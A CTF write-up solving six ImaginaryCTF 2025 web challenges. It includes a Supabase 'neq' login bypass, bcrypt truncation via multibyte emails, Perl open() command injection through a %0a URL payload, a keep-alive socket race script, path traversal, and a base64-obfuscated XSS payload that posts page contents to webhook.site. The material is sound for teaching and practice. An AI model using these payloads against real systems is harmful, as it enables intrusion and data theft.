---
title: "ImaginaryCTF 2025"
description: "ImaginaryCTF 2025 writeup"
summary: "ImaginaryCTF 2025 writeup"
categories: ["Writeup"]
tags: ["Web", "Path traversal", "Flask", "XSS"]
#externalUrl: ""
date: 2025-09-10
draft: false
cover: ../../post/imaginary2025/feature.png
authors:
  - winky
---


ImaginaryCTF 2025 has just ended. I cleared all the web challenges and this is my writeup for them.

![image](https://hackmd.io/_uploads/SJxT6Dpceg.png)

## imaginary-notes

![image](https://hackmd.io/_uploads/BJvjIc65le.png)

This is a blackbox web challenge and the flag is stored as password of `admin` account. We are given a register form: 

![image](https://hackmd.io/_uploads/SkS-vcacge.png)

After registration, we can access a note-making website. However, there is no XSS vulnerability here.

![image](https://hackmd.io/_uploads/B1yUwcacll.png)

When relogin, we can see an interesting request here:

![image](https://hackmd.io/_uploads/S1f6Dqpcge.png)

So it takes my username and password then submit to cloud supabase to authenticate. The result is the JSON includes our identity and an uuid. So, the query paremeters is something like a SQL query statement.

```sql
select * from users where username=winky1234 and password=winky1234
```

I deleted my password and use only `eq` and errors started to appear.

![image](https://hackmd.io/_uploads/HyYi55T9ge.png)

So the eq is one of supabase operators, let's search for it 

https://zone-www-dot-9obe9a1tk-supabase.vercel.app/docs/reference/javascript/eq

We also have neq operator

https://zone-www-dot-9obe9a1tk-supabase.vercel.app/docs/reference/javascript/neq

So what we can do? we can change the password to neq.dummy. This way, the query will look for the username admin where the password is not dummy, and we can extract the data from it.

POC:

![image](https://hackmd.io/_uploads/Bk3k2qaqle.png)

`Flag: ictf{why_d1d_1_g1v3_u_my_@p1_k3y???}`

### Note

We can also delete the password param like this:

![image](https://hackmd.io/_uploads/ByYv3qT9eg.png)

## certificate

![image](https://hackmd.io/_uploads/B1gnT5T9xx.png)

This is just a certificate making website.

![image](https://hackmd.io/_uploads/BkOK6qTqgg.png)

But the description says that we cannot create a flag for the user `Eth007`. I tried creating it, and the system returned `REDACTED`.

![image](https://hackmd.io/_uploads/HJDVC9a9ge.png)

So let's deep down to the source code

```js
const nameInput=document.getElementById('name');
const affInput=document.getElementById('affiliation');
const dateInput=document.getElementById('date');
const styleSelect=document.getElementById('style');
const svgHolder=document.getElementById('svgHolder');

const paperW=1122, paperH=794;
const logoUrl = 'https://2025.imaginaryctf.org/img/logo.png';

(function(){const d=new Date();dateInput.value=d.toISOString().slice(0,10)})();

function getStyleColors(style){
  if(style==='modern') return {bg:'#f7fff9', primary:'#0f766e', accent:'#0ea5a4', text:'#073040'};
  if(style==='dark') return {bg:'#0b1220', primary:'#0f1724', accent:'#8b5cf6', text:'#e6eef8'};
  return {bg:'#fbfdff', primary:'#eaf4ff', accent:'#1f6feb', text:'#07203a'};
}
function escapeXml(s){return String(s||"").replace(/[&<>'"]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;","'":"&apos;",'"':"&quot;"}[c]))}

function customHash(str){
  let h = 1337;
  for (let i=0;i<str.length;i++){
    h = (h * 31 + str.charCodeAt(i)) ^ (h >>> 7);
    h = h >>> 0; // force unsigned
  }
  return h.toString(16);
}

function makeFlag(name){
  const clean = name.trim() || "anon";
  const h = customHash(clean);
  return `ictf{${h}}`;
}

function buildCertificateSVG({participant,affiliation,date,styleKey}) {
  const colors = getStyleColors(styleKey);
  participant = escapeXml(participant||"—");
  affiliation = escapeXml(affiliation||"");
  date = escapeXml(date||"");
  return `
<svg xmlns="http://www.w3.org/2000/svg" width="${paperW}" height="${paperH}" viewBox="0 0 ${paperW} ${paperH}">
  <desc>${makeFlag(participant)}</desc>
  <rect width="100%" height="100%" fill="${colors.bg}"/>
  <rect x="40" y="40" width="${paperW-80}" height="${paperH-80}" rx="18" fill="${colors.primary}" opacity="0.08"/>
  <rect x="60" y="60" width="${paperW-120}" height="${paperH-120}" rx="14" fill="#ffffff"/>
  <image href="${logoUrl}" x="${paperW/2-100}" y="80" width="200" height="200" preserveAspectRatio="xMidYMid meet"/>
  <text x="${paperW/2}" y="340" text-anchor="middle" font-family="Georgia, serif" font-size="34" fill="${colors.text}">Certificate of Participation</text>
  <text x="${paperW/2}" y="380" text-anchor="middle" font-size="16" fill="${colors.text}" opacity="0.7">This certifies that</text>
  <text x="${paperW/2}" y="460" text-anchor="middle" font-size="48" font-weight="700" font-family="'Segoe UI',sans-serif" fill="${colors.text}">${participant}</text>
  <text x="${paperW/2}" y="505" text-anchor="middle" font-size="18" fill="${colors.text}" opacity="0.7">${affiliation}</text>
  <text x="${paperW/2}" y="560" text-anchor="middle" font-family="Georgia, serif" font-size="16" fill="${colors.text}" opacity="0.8">
    For popping shells, cracking codes, and capturing flags in ImaginaryCTF 2025.
  </text>
  <text x="${paperW/2}" y="620" text-anchor="middle" font-family="Roboto, sans-serif" font-size="14" fill="${colors.text}" opacity="0.7">Date: ${date}</text>
</svg>`.trim();
}

function renderPreview(){
  var name = nameInput.value.trim();
  if (name == "Eth007") {
    name = "REDACTED"
  } 
  const svg = buildCertificateSVG({
    participant: name || "Participant Name",
    affiliation: affInput.value.trim() || "Participant",
    date: dateInput.value,
    styleKey: styleSelect.value
  });
  svgHolder.innerHTML = svg;
  svgHolder.dataset.currentSvg = svg;
}

function downloadSvgFile(filename, svgText){
  const blob = new Blob([svgText], {type: "image/svg+xml;charset=utf-8"});
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  a.remove();
  setTimeout(()=>URL.revokeObjectURL(url), 1000);
}

document.getElementById('generate').addEventListener('click', e=>{
  e.preventDefault();
  renderPreview();
});
document.getElementById('downloadSvg').addEventListener('click', e=>{
  e.preventDefault();
  const svg = svgHolder.dataset.currentSvg;
  const nameFile = (nameInput.value.trim() || 'certificate').replace(/\s+/g,'_').toLowerCase();
  downloadSvgFile(`${nameFile}_imaginaryctf2025.svg`, svg);
});
document.getElementById('printBtn').addEventListener('click', e=>{
  e.preventDefault();
  window.print();
});

renderPreview();
```

First, we can see if user is Eth007, it will be replaced by REDACTED

```js
if (name == "Eth007") {
    name = "REDACTED"
} 
```

The name will go to `buildCertificateSVG` as `participant` attribute. After that, go to `makeFlag()`

```html
<desc>${makeFlag(participant)}</desc>
```

So what if we use makeFlag in console so that the replace condition is not work. And this is our flag

![image](https://hackmd.io/_uploads/SyUIyjaqlx.png)

`Flag: ictf{7b4b3965}`

## passwordless

![image](https://hackmd.io/_uploads/SyBojs6qel.png)

Source code:

```js
'use strict'

const bcrypt = require('bcrypt');
const sqlite3 = require('sqlite3').verbose()
const db = new sqlite3.Database(':memory:')
const normalizeEmail = require('normalize-email')
const crypto = require('crypto')
const path = require('path')
const express = require('express')
const session = require('express-session');
const rateLimit = require('express-rate-limit');


db.serialize(() => {
    db.run('CREATE TABLE users (email TEXT UNIQUE, password TEXT)')
})

const limiter = rateLimit({
    windowMs: 60 * 1000, // 1 minute
    limit: 10,
    standardHeaders: 'draft-8',
    legacyHeaders: false,
    handler: (req, res) => res.render('limited')
})

const app = express()

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

app.use(express.urlencoded())

app.use(session({
    resave: false,
    saveUninitialized: false,
    secret: crypto.randomBytes(64).toString('hex')
}));

app.use((req, res, next) => {
    var err = req.session.error;
    var msg = req.session.message;
    delete req.session.error;
    delete req.session.message;
    res.locals.err = '';
    res.locals.msg = '';
    res.locals.user = '';
    if (err) res.locals.err = err;
    if (msg) res.locals.msg = msg;
    if (req.session.user) res.locals.user = req.session.user.email.split("@")[0]
    next();
});

function restrict(req, res, next) {
    if (req.session.user) {
        next();
    } else {
        req.session.error = 'You need to be logged in to view this page'
        res.redirect('/login');
    }
}

function authenticated(req, res, next) {
    if (req.session.user) {
        res.redirect('/dashboard');
    } else {
        next();
    }
}

function authenticate(email, password, fn) {
    db.get(`SELECT * FROM users WHERE email = ?`, [email], (err, user) => {
        if (err) return fn(err, null)
        if (user && bcrypt.compareSync(password, user.password)) {
            return fn(null, user)
        } else {
            return fn(null, null)
        }
    });
}

app.post('/session', limiter, (req, res, next) => {
    if (!req.body) return res.redirect('/login')

    const email = normalizeEmail(req.body.email)
    const password = req.body.password

    authenticate(email, password, (err, user) => {
        if (err) return next(err)
        if (user) {
            req.session.regenerate(() => {
                req.session.user = user;
                res.redirect('/dashboard');
            });
        } else {
            req.session.error = 'Failed to log in'
            res.redirect('/login');
        }
    })
})

app.post('/user', limiter, (req, res, next) => {
    if (!req.body) return res.redirect('/login')

    const nEmail = normalizeEmail(req.body.email)

    if (nEmail.length > 64) {
        req.session.error = 'Your email address is too long'
        return res.redirect('/login')
    }

    const initialPassword = req.body.email + crypto.randomBytes(16).toString('hex')
    bcrypt.hash(initialPassword, 10, function (err, hash) {
        if (err) return next(err)

        const query = "INSERT INTO users VALUES (?, ?)"
        db.run(query, [nEmail, hash], (err) => {
            if (err) {
                if (err.code === 'SQLITE_CONSTRAINT') {
                    req.session.error = 'This email address is already registered'
                    return res.redirect('/login')
                }
                return next(err)
            }

            // TODO: Send email with initial password

            req.session.message = 'An email has been sent with a temporary password for you to log in'
            res.redirect('/login')
        })
    })
})

app.get('/register', authenticated, (req, res) => {
    res.render('register');
});

app.get('/login', authenticated, (req, res) => {
    res.render('login');
});

app.get('/logout', (req, res) => {
    req.session.destroy(function () {
        res.redirect('/login');
    });
});

app.get('/dashboard', restrict, (req, res) => {
    res.render('dashboard');
});

app.get('/', (req, res) => res.redirect('/dashboard'))

const port = 3000
app.listen(port, () => {
    console.log(`Example app listening on port ${port}`)
})
```

The website:

![image](https://hackmd.io/_uploads/HJVYr3T9eg.png)

When we register, the system is supposed to send a temporary password by email. However, this feature seems like under development.

```js
db.run(query, [nEmail, hash], (err) => {
    if (err) {
        if (err.code === 'SQLITE_CONSTRAINT') {
            req.session.error = 'This email address is already registered'
            return res.redirect('/login')
        }
        return next(err)
    }

    // TODO: Send email with initial password

    req.session.message = 'An email has been sent with a temporary password for you to log in'
    res.redirect('/login')
})
```

![image](https://hackmd.io/_uploads/SklTrnT9el.png)

Now the thing I could see is it uses bcrypt to hash password, store it, and use `bcrypt.compareSync` to check the password. Moreover, we can research that bcrypt only has 72 characters limit.

https://www.ory.sh/docs/troubleshooting/bcrypt-secret-length

POC:

```js
const bcrypt = require('bcrypt');

// 'a' * 72
const a = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
const b = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadummy'

bcrypt.hash(b, 10, (err, hash) => {
    console.log(bcrypt.compareSync(a, hash))
})
```

![image](https://hackmd.io/_uploads/rko1t669lg.png)

### The problem

But the email can't be longer than 64 characters so we can't send > 72 characters email.

```js
if (nEmail.length > 64) {
    req.session.error = 'Your email address is too long'
    return res.redirect('/login')
}
```

From this blog https://www.monterail.com/blog/more-secure-passwords-bcrypt, we can use unicode characters to bypass because it can have more than 1 byte per char.

![image](https://hackmd.io/_uploads/HJAo9pT9ex.png)

POC:

```js
const bcrypt = require('bcrypt');

// 36 * 'ą'
const a = 'ąąąąąąąąąąąąąąąąąąąąąąąąąąąąąąąąąąąą'
const b = 'ąąąąąąąąąąąąąąąąąąąąąąąąąąąąąąąąąąąądummy'
console.log(b.length())

bcrypt.hash(b, 10, (err, hash) => {
    console.log(bcrypt.compareSync(a, hash))
})
```

![image](https://hackmd.io/_uploads/HyhUspa9gg.png)

### Solve script

```python
import requests
import re

URL = 'http://passwordless.chal.imaginaryctf.org/'

email = 'ą' * 36 + '@gmail.com'

r = requests.post(URL + 'user', data={'email': email})
r = requests.post(URL + 'session', data={'email':email, 'password':email})

m = re.findall(r'ictf{.*}', r.text)
print(m[0])
```

![image](https://hackmd.io/_uploads/BJ9U2aa9eg.png)

`Flag: ictf{8ee2ebc4085927c0dc85f07303354a05}`

## pearl

![image](https://hackmd.io/_uploads/Sywa2669lg.png)

The website: 

![image](https://hackmd.io/_uploads/S11J6T69eg.png)

When I tried to access an arbitrary endpoint, the server returned a 500 error. However, the open file message suggests that it might be using the `open` function in `Perl`.

![image](https://hackmd.io/_uploads/HJ5zppp5xl.png)

From this blog, `open` function in Perl can run system command https://www.shlomifish.org/lecture/Perl/Newbies/lecture4/processes/opens.html

I try to add | after command and still 500

![image](https://hackmd.io/_uploads/S1CiApT5ee.png)

After fuzzing a while, we can bypass using %0a

![image](https://hackmd.io/_uploads/HkdfyAp5gl.png)

Now read the flag : `http://pearl.chal.imaginaryctf.org/%0acat%20/flag*%7C`

![image](https://hackmd.io/_uploads/Hy-D106cxl.png)


`Flag: ictf{uggh_why_do_people_use_perl_1f023b129a22}`

### Note

Why we need %0a ? After reading the challenge source:

https://github.com/ImaginaryCTF/ImaginaryCTF-2025-Challenges/blob/main/Web/pearl/challenge/server.pl

```perl
my $webroot = "./files";
...
my $fullpath = File::Spec->catfile($webroot, $path);
...
open(my $fh, $fullpath) or do {
    $c->send_error(RC_INTERNAL_SERVER_ERROR, "Could not open file.");
    next;
};
```

We need `%0a` because without it the path is appended directly to `./files`, so `ls|` just becomes a literal filename `./files/ls|` and fails. With %0a, the string turns into two lines:

```
./files
ls|
```

Perl’s open sees the second line alone, and since it ends with |, it’s treated as a command to execute instead of a file.


## pwntools

![image](https://hackmd.io/_uploads/ByhsXC6qxx.png)

![image](https://hackmd.io/_uploads/ryTDThyige.png)

Source code: https://github.com/ImaginaryCTF/ImaginaryCTF-2025-Challenges/tree/main/Web/pwntools/challenge/challenge

we can easily see that `/flag` needs admin authorization. But admin password is random `''.join(random.choices(string.ascii_letters + string.digits, k=12))`.  The `/register` can change admin password but it needs the client IP is 127.0.0.1 The bot can only visit an URL without any headers or body content. 

### The key

The server uses `clients = {}` to store all connections. when having a request, it stores IP address in this socket.

```python
client_sock, addr = server.accept()
```

Then it add a socket with that address to `clients`

```python
client_sock.setblocking(False)
clients[client_sock] = {"addr": addr, "buffer": b""}
print(f"[*] New client {addr}")
```

The socket still there if there is `keep_alive` Connection header 

```python
if not keep_alive:
    s.close()
    del clients[s]
    break
```

And in the next request, it uses the same IP address socket if there is keep_alive socket before. But the address will use the last socket

```python
read_list = [server]+list(clients.keys())
rlist, _, _ = select.select(read_list, [], [], 0.1)
```

POC to let the bot add local IP address socket

```python
from pwn import *
import base64
import re
import time

HOST = "127.0.0.1"
PORT = 5000

def http_send(r, req):
    r.send(req)
    hdr = r.recvuntil(b"\r\n\r\n", timeout=10)
    if not hdr:
        return None, None, None
    m = re.match(br'HTTP/1\.\d\s+(\d{3})', hdr)
    status = int(m.group(1)) if m else None
    mlen = re.search(br'(?i)\r\nContent-Length:\s*(\d+)\r\n', hdr)
    clen = int(mlen.group(1)) if mlen else 0
    body = r.recvn(clen, timeout=10) if clen else b""
    return status, hdr, body
    
def visit():
    r = remote(HOST, PORT)
    req = (
        "POST /visit HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        "X-Target: http://127.0.0.1:8080/\r\n"
        "Content-Length: 0\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()
    http_send(r, req)
    r.close()
    
def trigger(r):
    req = (
        "GET /hihi HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        "Content-Length: 0\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
    ).encode()
    status, hdr, body = http_send(r, req)
    text = (body or b"").decode(errors="ignore")
    return status, text
    
p = remote(HOST, PORT)

visit()

for _ in range(200):
    status, text = trigger(p)
```

When the bot visits, the last socket have local address

![image](https://hackmd.io/_uploads/Sk3fnAkoxe.png)

Now the strategy is that 

* Open a keep_alive connection
* Trigger bot to visit. Add `127.0.0.1` socket to clients
* Immediately send a `/register` request on that same socket. But it will uses the last socket IP address is `127.0.0.1`
* Overwrite admin password
* Get the flag

### Solve script

```python
from pwn import *
import base64
import re
import time

HOST = "127.0.0.1"
PORT = 5000

new_password = "winky123"

def http_send(r, req):
    r.send(req)
    hdr = r.recvuntil(b"\r\n\r\n", timeout=10)
    if not hdr:
        return None, None, None
    m = re.match(br'HTTP/1\.\d\s+(\d{3})', hdr)
    status = int(m.group(1)) if m else None
    mlen = re.search(br'(?i)\r\nContent-Length:\s*(\d+)\r\n', hdr)
    clen = int(mlen.group(1)) if mlen else 0
    body = r.recvn(clen, timeout=10) if clen else b""
    return status, hdr, body
    
def visit():
    r = remote(HOST, PORT)
    req = (
        "POST /visit HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        "X-Target: http://127.0.0.1:8080/\r\n"
        "Content-Length: 0\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()
    http_send(r, req)
    r.close()
    
def register(r):
    req = (
        "POST /register HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        "X-Username: admin\r\n"
        f"X-Password: {new_password}\r\n"
        "Content-Length: 0\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
    ).encode()
    status, hdr, body = http_send(r, req)
    text = (body or b"").decode(errors="ignore")
    return status, text
    
def get_flag():
    r = remote(HOST, PORT)
    auth = base64.b64encode(f"admin:{new_password}".encode()).decode()
    req = (
        "GET /flag HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"Authorization: Basic {auth}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()
    status, hdr, body = http_send(r, req)
    r.close()
    if body:
        m = re.search(br"<pre>(.*?)</pre>", body, re.S)
        print("[+] FLAG:", (m.group(1) if m else body).decode(errors="ignore").strip())
    else:
        print(hdr.decode(errors="ignore"))
        
p = remote(HOST, PORT)

visit()

flag = False
for _ in range(200):
    status, text = register(p)
    if status == 200 and "Registered successfully" in text:
        print("[+] Admin password overwritten")
        flag = True
        break
    time.sleep(0.25)

get_flag()
```

![image](https://hackmd.io/_uploads/S1P6V0yjxe.png)

Now use the solve script, we will have the real flag in remote

`Flag: ictf{oops_ig_my_webserver_is_just_ai_slop_b9f415ea}`

## codenames-1

![image](https://hackmd.io/_uploads/Bya5zz1jgx.png)

The source is too long so I refer to it here :

https://github.com/ImaginaryCTF/ImaginaryCTF-2025-Challenges/tree/main/Web/codenames-1/challenge

First, let’s look at what the website is. It is a game where players guess cells.

![image](https://hackmd.io/_uploads/rycAWjksxl.png)

In the lobby, there are two modes. In hard mode, if you click on the opposite color, you immediately lose.

![image](https://hackmd.io/_uploads/SyTgfjkoel.png)

We can play with friends using code or add a bot to play with.

![image](https://hackmd.io/_uploads/S1ubGs1ige.png)

And this is the game:

![image](https://hackmd.io/_uploads/H1UCXi1sxx.png)

Now let’s spot what we can do. When we create a game, we can control the language that is sent to the server.

![image](https://hackmd.io/_uploads/rkCGEsksxe.png)

Then the server reads the language file in the code, takes all the words, and randomly chooses 25 of them to add to the game.

![image](https://hackmd.io/_uploads/BkCYVj1iex.png)

So it uses `os.path.join()` to concat the filename. Let's deep down to its behavior here: https://www.geeksforgeeks.org/python/python-os-path-join-method/ . As we can see, if there is root directory or file, it will start from there:

![image](https://hackmd.io/_uploads/BJqWro1olx.png)

So we can send `language=/flag` to read `/flag.txt` and add it to `word_list`

![image](https://hackmd.io/_uploads/HyrB_oJieg.png)

![image](https://hackmd.io/_uploads/SypvSsksgl.png)

Start the game and we will have flag1

![image](https://hackmd.io/_uploads/BJoQ_skjxl.png)

Flag1 in remote

![image](https://hackmd.io/_uploads/By3n5sJjgg.png)

`Flag: ictf{common_os_path_join_L_b19d35ca}`


## codenames-2

![image](https://hackmd.io/_uploads/BJTjfMyoxg.png)

Now we need to win the game in hard mode with a bot to get flag2.

```python
if game.get('hard_mode'):
    # include flag if a bot is in this game
    if game.get('bots'):
        try:
            payload['flag'] = os.environ.get("FLAG_2")
        except Exception:
            pass
emit('update', payload, room=code)
```

So it's difficult to play and win except bruteforcing but I think it's not a good idea. So I come up with an XSS bug because the bot will access to the game. Here is the bot's POV, so if we know the bot's board colors we can win: 

![image](https://hackmd.io/_uploads/B1Hwsokill.png)

Where can we have XSS? As we saw above, the bot’s username is rendered. However, since it is random, just ignore it.

```python
username = f"BOT_{code}_" + os.urandom(4).hex()
password = os.environ.get('BOT_SECRET_PREFIX', "") + os.urandom(16).hex()
```

The thing we should focus on is the cell content. It is inserted using `innerHTML`, which comes from the board that we loaded from the file, like in codenames-1.

```js
function renderBoard() {
boardTable.innerHTML = '';
for (var i = 0; i < board.length; i++) {
  if (i % 5 === 0) {
    var row = boardTable.insertRow();
  }
  var word = board[i];
  var cell = row.insertCell();
  cell.innerHTML = word;
  cell.id = 'cell-' + i;
  cell.setAttribute('data-idx', i);
  cell.className = 'cell';
    
...
```

So what if we can control what is displayed? We can notice that every user created will have their information saved in the `profiles` folder.

![image](https://hackmd.io/_uploads/BJYMAsJigl.png)

And if we create a `.txt` username. Its information will be written to that file.

![image](https://hackmd.io/_uploads/H1FwAjJoee.png)

Log in as `hihi.txt` and create the game with language `/app/profiles/hihi` and we have

![image](https://hackmd.io/_uploads/Hyoj0jkile.png)

Ok. Now try with `<img src=x onerror=alert(1) >.txt`

![image](https://hackmd.io/_uploads/BJ4M12Jsgx.png)

Good! Now we have XSS now use this to fetch the document.body of bot page

```js
fetch('https://webhook.site/71d7a6db-1541-40cf-a397-b2fff5f03cfb',{method:'POST',body:document.body.innerHTML})
```

Before that, we use base64 form because the server blocks `.` and `/`

```html
<img src=x onerror=eval(atob('ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzcxZDdhNmRiLTE1NDEtNDBjZi1hMzk3LWIyZmZmNWYwM2NmYicse21ldGhvZDonUE9TVCcsYm9keTpkb2N1bWVudC5ib2R5LmlubmVySFRNTH0pCg')) >.txt
```

When we add a bot and start the game in hard mode, many requests are sent. However, we should notice that the response includes the bot’s identification.

![image](https://hackmd.io/_uploads/BkcJV3yilx.png)

Try to render: 

![image](https://hackmd.io/_uploads/SkFAm2yjgx.png)

OK! now that we have the board, just play and win.

![image](https://hackmd.io/_uploads/HJqT72Joxg.png)

Using the same strategy we will have the real flag in remote

`Flag: ictf{insane_mind_reading_908f13ab}`
